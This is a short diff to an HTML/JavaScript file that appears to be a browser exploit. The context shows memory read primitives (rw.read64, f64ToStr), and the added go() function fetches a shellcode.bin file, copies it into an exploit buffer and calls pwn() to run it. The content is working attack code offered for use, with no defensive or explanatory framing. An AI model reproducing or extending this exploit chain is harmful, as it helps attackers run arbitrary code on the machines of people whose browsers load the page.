@@ -587,6 +587,25 @@ alert("inst: " + bh.f64ToStr(inst));
 // it causing a crash. There might be some other reasons as well ...
 rw.read64()
 
+
+function go() {
+    fetch('/shellcode.bin').then((response) => {
+        response.arrayBuffer().then((buffer) => {
+            try {
+                shellcode_length = buffer.byteLength
+                if (shellcode_length > 0x1000000) {
+                    fail(5)
+                }
+                u8_buffer.set(new Uint8Array(buffer), 0x4000)
+                print('got ' + shellcode_length + ' bytes of shellcode, pwning')
+                pwn()
+            } catch (e) {
+                print_error(e)
+            }
+        })
+    })
+}
+
 </script>
 </body>
 </html>
